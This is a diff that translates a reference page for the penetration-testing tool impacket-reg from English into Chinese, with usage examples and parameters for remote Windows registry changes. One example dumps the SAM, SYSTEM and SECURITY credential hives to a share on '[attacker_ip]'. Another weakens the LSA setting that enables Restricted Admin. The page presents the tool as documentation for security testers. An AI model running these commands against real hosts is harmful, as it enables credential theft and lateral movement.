@@ -1,30 +1,30 @@
 # TAGLINE
 
-Remote Windows registry manipulation tool
+远程 Windows 注册表操作工具
 
 # TLDR
 
-**Query a registry key** and list its subkeys and values
+**查询注册表键**并列出其子键和值
 
 ```impacket-reg '[domain]/[user]:[password]@[target]' query -keyName 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion'```
 
-**Recursively query** all subkeys under a registry path
+**递归查询**注册表路径下的所有子键
 
 ```impacket-reg '[domain]/[user]:[password]@[target]' query -keyName 'HKLM\SYSTEM\CurrentControlSet' -s```
 
-**Query a specific value** by name
+**按名称查询特定值**
 
 ```impacket-reg '[domain]/[user]:[password]@[target]' query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -v ProductName```
 
-**Add a registry value**
+**添加注册表值**
 
 ```impacket-reg '[domain]/[user]:[password]@[target]' add -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\Lsa' -v DisableRestrictedAdmin -vt REG_DWORD -vd 0```
 
-**Delete a registry value**
+**删除注册表值**
 
 ```impacket-reg '[domain]/[user]:[password]@[target]' delete -keyName 'HKLM\SOFTWARE\TestKey' -v TestValue```
 
-**Backup SAM, SYSTEM, and SECURITY hives**
+**备份 SAM、SYSTEM 和 SECURITY 配置单元**
 
 ```impacket-reg '[domain]/[user]:[password]@[target]' backup -o '\\[attacker_ip]\[share]'```
 
@@ -35,87 +35,87 @@ Remote Windows registry manipulation tool
 # PARAMETERS
 
 **-debug**
-> Turn DEBUG output on.
+> 开启 DEBUG 输出。
 
 **-ts**
-> Add timestamp to every logging output.
+> 为每条日志输出添加时间戳。
 
 **-hashes** _LMHASH:NTHASH_
-> Use NTLM hashes for authentication.
+> 使用 NTLM 哈希进行身份验证。
 
 **-no-pass**
-> Do not prompt for password.
+> 不询问密码。
 
 **-k**
-> Use Kerberos authentication from ccache file (KRB5CCNAME).
+> 使用 ccache 文件（KRB5CCNAME）中的 Kerberos 身份验证。
 
 **-aesKey** _KEY_
-> AES key for Kerberos authentication (128 or 256 bit).
+> 用于 Kerberos 身份验证的 AES 密钥（128 或 256 位）。
 
 **-dc-ip** _IP_
-> IP address of the domain controller.
+> 域控制器的 IP 地址。
 
 **-target-ip** _IP_
-> IP address of the target machine.
+> 目标机器的 IP 地址。
 
 **-port** _PORT_
-> Destination port (139 or 445, default 445).
+> 目标端口（139 或 445，默认 445）。
 
 # QUERY OPTIONS
 
 **-keyName** _KEYNAME_
-> Full registry path with root key (HKLM, HKU, HKCU, HKCR).
+> 包含根键的完整注册表路径（HKLM、HKU、HKCU、HKCR）。
 
 **-v** _VALUENAME_
-> Query a specific registry value name.
+> 查询特定的注册表值名称。
 
 **-ve**
-> Query the default (empty) value name.
+> 查询默认（空）值名。
 
 **-s**
-> Recursively query all subkeys and values.
+> 递归查询所有子键和值。
 
 # ADD OPTIONS
 
 **-keyName** _KEYNAME_
-> Full registry path for the new key or value.
+> 新键或新值的完整注册表路径。
 
 **-v** _VALUENAME_
-> Value name to set.
+> 要设置的值名。
 
 **-vt** _VALUETYPE_
-> Registry type (REG_SZ, REG_DWORD, REG_BINARY, REG_EXPAND_SZ, REG_MULTI_SZ, REG_QWORD, etc.).
+> 注册表类型（REG_SZ、REG_DWORD、REG_BINARY、REG_EXPAND_SZ、REG_MULTI_SZ、REG_QWORD 等）。
 
 **-vd** _VALUEDATA_
-> Data to set. Use multiple times for REG_MULTI_SZ.
+> 要设置的数据。REG_MULTI_SZ 类型可多次使用。
 
 # DELETE OPTIONS
 
 **-keyName** _KEYNAME_
-> Full registry path to delete from.
+> 要从中删除的完整注册表路径。
 
 **-v** _VALUENAME_
-> Specific value to delete.
+> 要删除的特定值。
 
 **-va**
-> Delete all values under the key.
+> 删除该键下的所有值。
 
 **-ve**
-> Delete the default value.
+> 删除默认值。
 
 # DESCRIPTION
 
-**impacket-reg** provides remote Windows registry manipulation through the MS-RRP MSRPC interface, functioning as a remote equivalent to Windows **reg.exe**. It can query, add, delete, and save registry keys and values on remote Windows machines.
+**impacket-reg** 通过 MS-RRP MSRPC 接口提供远程 Windows 注册表操作功能，相当于 Windows **reg.exe** 的远程版本。它可以查询、添加、删除和保存远程 Windows 机器上的注册表键和值。
 
-The tool automatically starts the Remote Registry service on the target if it is not running (even if disabled), and restores the original state when finished. This makes it effective even against hardened hosts where the service has been manually disabled.
+如果目标上的 Remote Registry 服务未运行（即使已被禁用），该工具会自动启动它，并在完成后恢复原始状态。因此即使面对已手动禁用该服务的加固主机，它也能生效。
 
 # CAVEATS
 
-Requires administrative credentials on the target. Valid root keys are **HKLM**, **HKU**, **HKCU**, and **HKCR**. Modifying critical registry keys (e.g. under SYSTEM or Security) can render the target unbootable. The backup command writes to a UNC path, so the attacker must have a writable SMB share accessible from the target.
+需要对目标具有管理员凭据。有效的根键为 **HKLM**、**HKU**、**HKCU** 和 **HKCR**。修改关键注册表键（例如 SYSTEM 或 Security 下）可能导致目标无法启动。backup 命令写入 UNC 路径，因此攻击者必须拥有可从目标访问的可写 SMB 共享。
 
 # HISTORY
 
-Part of the **Impacket** library by **SecureAuth** (now **Fortra**). The tool implements the MS-RRP (Windows Remote Registry Protocol) specification over MSRPC, enabling remote registry operations commonly used in penetration testing for persistence, lateral movement, and credential extraction.
+属于 **SecureAuth**（现为 **Fortra**）的 **Impacket** 库。该工具基于 MSRPC 实现 MS-RRP（Windows 远程注册表协议）规范，支持渗透测试中常见的用于持久化、横向移动和凭据提取的远程注册表操作。
 
 # INSTALL
 
